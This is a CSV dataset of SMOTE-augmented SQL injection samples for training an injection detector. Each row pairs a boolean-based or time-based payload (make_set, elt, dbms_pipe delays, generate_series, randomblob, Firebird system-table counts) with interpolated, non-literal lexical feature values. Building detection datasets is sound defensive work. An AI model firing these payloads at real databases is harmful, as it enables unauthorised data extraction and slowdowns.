id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000158,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000014,1.1176004722619337,77.18936099909764,22.800664937556398,3.485548024700137,18.408644188233165,13.59800518733081,31.986701248872052,13.196010374661617,0.2449343977399705,0.17609469832946104,0.40926633400027,0.16970456993029848,4.0,1.1102230246251565e-16,0.19933506244360277,0.0,0.0,2.0,0.0,4.797340249774411,0.39867012488720555,0.8006649375563972,1.0,2.1993350624436028,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8006649375563972,0.19933506244360277,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000159,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000021,1.3712392177160058,145.22175622273895,32.70362603712316,4.098873782707898,70.40725207424632,11.0746177401379,45.22175622273895,18.518130185615785,0.4848806562985354,0.07671023311601394,0.3111485319763543,0.12726057860909645,0.7036260371231572,1.1102230246251565e-16,2.0,0.0,1.0,1.2963739628768427,0.0,6.407252074246315,0.7036260371231572,0.0,2.7036260371231573,4.296373962876843,0.7036260371231572,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.29637396287684287,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2963739628768427
SMOTE_000160,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000018,0.21321406578026605,152.89164077530634,34.74422479430146,4.298524463336266,75.40319118670341,16.914741598100488,42.829483196200975,17.744224794301463,0.49315311521732724,0.1106526808937675,0.28020631200500956,0.11598789188389569,0.9147415981004872,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.914741598100487,5.0,0.9147415981004872,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000161,attack,boolean,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000013,1.892841506879785,90.27288226364412,22.0,2.949029267369157,10.728822636441208,15.181353209067638,47.45423547271176,16.908470945423517,0.11860939916612401,0.16824855587274498,0.525736610975475,0.18740543398565598,2.908470945423517,1.0915290545764829,0.7271177363558793,0.0,0.2728822636441207,1.7271177363558792,0.0,8.0,1.4542354727117588,0.0,0.7271177363558793,2.727117736355879,0.7271177363558793,0.27288226364412066,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2728822636441208,0.7271177363558793,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000162,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000019,1.1696389098910638,117.61998462070443,30.692725874609494,3.5578561784287186,36.67589965361408,12.48045559404288,50.731814686523734,17.731814686523734,0.3068777717848292,0.10896046725357492,0.43465881753855334,0.1495029434230425,0.8268185313476264,0.5195444059571204,1.653637062695253,0.0,0.8268185313476264,1.0,0.0,9.51954440595712,0.0,1.1731814686523736,1.0,4.51954440595712,0.8268185313476264,0.17318146865237352,0.8268185313476264,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.17318146865237358,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000163,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000019,0.5211626098997838,111.2491179831462,29.953736370994584,3.487219582758144,32.46263629005415,13.0,49.78648169309206,16.0,0.2916335910049952,0.11710427778494355,0.4471337893208999,0.1441283418891613,1.1387908870162458,1.1102230246251565e-16,1.9074727419891695,0.0,0.9537363709945847,1.0462636290054155,0.0,9.046263629005415,0.0,0.9537363709945847,0.9537363709945849,3.9074727419891695,1.0,0.0,0.9537363709945846,0.0,0.0,1.0,1.0,0.0,0.0,0.04626362900541518,0.0,1.0,0.0,0.0,0.9537363709945847,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.04626362900541518,0.04626362900541518,3.0462636290054155
SMOTE_000164,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000019,1.1387125223132244,117.41850483431547,30.674409530392314,3.556178170646054,36.55226433014813,12.494192852205764,50.68602382598079,17.686023825980786,0.30645554436943323,0.1092042887188036,0.43494426705882105,0.1493958998529421,0.8313976174019213,0.5058071477942359,1.6627952348038424,0.0,0.8313976174019213,1.0,0.0,9.505807147794236,0.0,1.168602382598079,1.0,4.505807147794236,0.8313976174019213,0.16860238259807875,0.8313976174019212,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.16860238259807875,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000165,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000018,0.772216500485373,156.3387210570603,34.76612789429397,4.256036680298187,77.40323263423618,16.76612789429397,44.403232634236176,17.76612789429397,0.49502514354354565,0.10738935056031225,0.2837952494543387,0.11379025644180338,0.7661278942939701,0.2338721057060298,2.0,0.0,1.0,2.0,0.0,5.23387210570603,0.0,0.0,2.7661278942939704,5.0,0.7661278942939702,0.23387210570602984,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000166,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000004,2.386219131840856,91.92625426030708,26.45390891269192,3.499659975791198,26.39859960792222,13.0,39.509218217461616,13.018436434923231,0.2851119112252257,0.14168545154072065,0.4308429252751349,0.14235971195891875,2.5276546523848493,1.1102230246251565e-16,0.0,0.0,0.4907817825383836,1.5092182174616164,0.0,6.490781782538384,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.4907817825383836,0.0,0.0,0.4907817825383836,1.5092182174616164,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4907817825383836
SMOTE_000167,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000011,0.8233021834156559,144.34154284900063,30.780514283000212,3.8886428956413974,50.14641427825058,14.829228575499682,53.36589999525037,26.0,0.34682626535392136,0.10336042491937739,0.3694986999806804,0.18031460974602084,0.0,3.804871429249947,0.0,0.0,0.0,1.804871429249947,0.0,10.390257141500106,0.0,2.0,1.0,7.804871429249947,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,0.19512857075005285,0.0,0.0,0.19512857075005285,1.804871429249947,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.195128570750053
SMOTE_000168,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000030,0.17841792651170463,142.62242376073436,32.14108032702038,4.133012023872965,69.91702212563247,16.0,41.56432130808152,15.14108032702038,0.4901121293990446,0.1123525869152504,0.291344487556192,0.10619079612951297,0.0,0.07054016351019021,2.0,0.0,1.0,2.0,0.0,5.07054016351019,0.0,0.0,2.0,5.0,0.0,0.0705401635101901,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000169,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000003,0.41347083564307796,75.68987414799996,22.106134484307685,3.3878274604419736,17.21226896861537,13.946932757846158,30.53067242153843,14.0,0.22730186547426567,0.18460026041916097,0.4028945768447551,0.18520329726181828,0.2122689686153718,1.1102230246251565e-16,0.0,0.0,0.0,1.053067242153843,0.0,5.053067242153842,0.0,1.0,3.8407982735384714,1.0530672421538432,0.0530672421538429,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.053067242153843,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9469327578461572,0.9469327578461569,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9469327578461573
SMOTE_000170,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000019,1.6223639786968391,102.79585380695983,28.261068160300646,3.4416309762964934,28.52213632060129,13.0,46.26739282332959,15.006324663028941,0.2738459790621131,0.1286929181267702,0.4513374157155133,0.1461236870956034,0.7515811657572351,0.9936753369710594,1.5031623315144702,0.0,1.0,1.0,0.0,8.254743497271706,0.0,0.7515811657572352,0.7515811657572352,3.5031623315144707,0.7515811657572352,0.2484188342427648,0.7515811657572351,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7515811657572352,0.0,0.0,0.7515811657572352,1.2484188342427647,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7515811657572353
SMOTE_000171,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000004,1.2325521452685324,88.50463415958065,23.495365840419353,3.2685185282572276,17.71987796272579,13.756951239370972,42.01853663832259,15.009268319161295,0.20085251810210555,0.15530952840784054,0.4744249820440861,0.16941297144596779,4.0,1.1102230246251565e-16,0.2523170797903237,0.0,0.0,2.0,0.0,6.504634159580648,0.5046341595806474,0.7476829202096762,1.0,2.2523170797903234,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7476829202096762,0.2523170797903239,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000172,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000023,1.3152223345439444,87.3599237048092,22.214122135011223,3.1757493998368242,18.642366405033673,13.0,42.145801569797975,13.571755729977554,0.2162127585642261,0.149884317172183,0.47827612896204225,0.15562679530154866,0.8564885400448956,3.143511459955105,0.0,0.0,0.7858778649887762,1.214122135011224,0.0,7.143511459955104,0.0,0.2141221350112238,0.21412213501122368,2.0,0.21412213501122374,0.7858778649887761,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000173,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,nearest_attack_euclidean,R000022,1.538348878051433,162.5956663034264,33.16856404668099,3.8865766197252265,57.50569214004297,16.0,60.71355112837272,28.376423035010742,0.3531696974061717,0.09886273219086088,0.37317025538442117,0.1747973150185462,0.0,3.2078589883297526,0.0,0.0,0.0,1.2078589883297526,0.0,13.16856404668099,0.7921410116702473,2.0,3.376423035010742,5.623576964989258,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,1.2078589883297526,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.376423035010742,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.584282023340495
SMOTE_000174,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000014,0.0200752992641112,74.05556142034007,22.99673168115647,3.62688736180937,20.990195043469402,13.0,28.058829739183594,12.006536637687066,0.28350276854612333,0.17556841424644776,0.37879383441194897,0.16213498279547997,3.986926724625868,0.013073275374131832,0.0,0.0,0.003268318843532958,1.9967316811564668,0.0,4.013073275374133,0.0,0.996731681156467,0.996731681156467,2.0,0.996731681156467,0.003268318843533069,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000175,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000018,0.8930932275999947,147.9302198449525,33.98836997415875,4.28916809256846,73.63952993970375,16.66278999138625,40.9767399483175,16.651159965545,0.4981756542445563,0.11283689463852607,0.2768056960804019,0.1121817550365157,0.6627899913862498,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,4.66278999138625,0.0,0.0,2.6627899913862496,5.0,0.6627899913862498,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000176,attack,boolean,"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",nearest_attack_euclidean,R000008,3.1583499929519396,143.8661656907918,31.817844574561093,4.20550119671994,79.27508797807235,9.0,38.77323313815836,16.817844574561093,0.5500068697774592,0.06272614858187031,0.2696957206465226,0.1175712609941479,0.5910777127194539,0.40892228728054625,0.8178445745610924,0.0,1.0,1.0,0.0,5.0,0.40892228728054625,0.0,3.0,2.8178445745610925,0.5910777127194538,0.4089222872805462,0.4089222872805462,0.5910777127194536,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.5910777127194538,0.4089222872805462,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000177,attack,boolean,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000016,0.4883906353950717,138.61606973449761,31.3364842616662,3.368403516340028,33.87202324483254,14.86729685233324,66.54026537566565,23.3364842616662,0.24324909921519922,0.1081036300119065,0.48063960233699754,0.16800766843589673,1.8672968523332403,4.0,0.0,0.9336484261666202,0.0663515738333798,1.93364842616662,0.0,11.73459370466648,1.86729685233324,0.0,0.9336484261666201,2.93364842616662,0.9336484261666201,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000178,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000014,0.24441864388187812,75.99270051162617,23.14233575083044,3.5947026271845886,21.0,13.0,29.70802900996528,12.284671501660881,0.2773576918390434,0.17169761875750306,0.3892196763531785,0.16172501305027506,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,4.28467150166088,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000179,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000024,1.6307553489796716,140.66299054389214,32.850257805507944,3.804093028974983,52.79139214974288,10.689845316695235,54.40103122203176,22.780721855422236,0.37166923356133447,0.08114219922430635,0.38843630723101036,0.15875225998334883,0.22994843889841166,2.3101546833047646,0.0,0.0,0.2299484388984117,1.0,0.0,10.85025780550794,0.0,1.7700515611015883,1.0,5.850257805507941,0.2299484388984117,0.7700515611015882,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.7700515611015881,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000180,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000030,0.06408291409239693,140.91471144109954,32.014214759816745,4.139399320641349,69.02842951963349,15.900496681282785,40.94314096073302,15.042644279450235,0.4898814537868376,0.11280980556886158,0.29054266910314025,0.1067660715411605,0.0,0.014214759816745137,2.0,0.0,1.0,1.985785240183255,0.0,5.0,0.014214759816745026,0.0,2.014214759816745,4.9857852401832545,0.0,0.01421475981674497,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.9857852401832552,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.985785240183255
SMOTE_000181,attack,boolean,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000013,0.1817411544963636,89.48135477349192,22.032415326656754,2.933556330457341,8.421399246537817,15.902754020029736,47.3516934668649,17.805508040059472,0.0952064705706408,0.17770963745147228,0.5283104178513858,0.19877347412650118,4.0,1.1102230246251565e-16,0.967584673343245,0.0,0.0,2.0,0.0,7.870338693372981,1.9351693466864899,0.03241532665675495,1.0,2.967584673343245,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.032415326656755,0.967584673343245,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000182,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000029,2.179573127576918,144.7858313282057,37.31143325312823,4.00903048303925,48.557166265641136,21.622866506256457,52.180032771897594,22.42576578441051,0.3361898578880404,0.14976255985693498,0.36088009927636683,0.1531674829786578,3.688566746871772,1.1102230246251565e-16,0.6228665062564556,0.0,0.6885667468717722,2.0,0.0,8.934299759384682,0.0,1.3114332531282278,1.0,7.180032771897595,1.0,0.0,0.3114332531282278,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.3114332531282278,1.6885667468717722,0.0,1.0,0.6885667468717722,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.377133493743544
SMOTE_000183,attack,boolean,"1%'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000015,0.44347029534447246,129.45259574665434,31.10375683904674,3.525542248506229,35.0,15.0,57.24508206856086,22.207513678093477,0.27064035810228315,0.11598872490097849,0.4417927565450675,0.17157816045167087,5.584972643813048,0.41502735618695274,0.0,1.0,0.0,2.0,0.0,10.207513678093477,2.0,0.0,1.0,3.0,1.0,0.10375683904673816,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000184,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'qomf' like 'qomf",nearest_attack_euclidean,R000012,2.0652693996866125,138.4745366164359,33.746649554794196,3.913149304880408,55.22922723972403,10.752010267123481,50.49865982191768,21.99463928767072,0.3918937238724628,0.08025504627579337,0.3698771674573455,0.15797406239439832,2.4986598219176797,1.1102230246251565e-16,0.5013401780823206,0.0,0.2506700890411602,0.2506700890411604,0.0,10.49865982191768,0.0,1.7493299109588398,1.0,5.49865982191768,1.0,0.0,0.2506700890411602,0.0,0.0,0.2506700890411603,1.0,0.0,0.0,0.0,0.7493299109588396,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000185,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000004,2.4309432698871403,97.3178305006374,26.54122650017384,3.43387829617444,25.6589152503187,13.0,43.81183975026076,14.847075500057946,0.26077583693333267,0.1352136573855076,0.4506951113633729,0.15331539431778674,2.7293867499130817,1.1102230246251565e-16,0.8470755000579457,0.0,0.42353775002897287,1.576462249971027,0.0,7.270613250086918,0.0,1.0,1.0,2.8470755000579455,1.0,0.0,0.4235377500289729,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.423537750028973,0.0,0.0,0.42353775002897287,1.5764622499710272,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4235377500289728
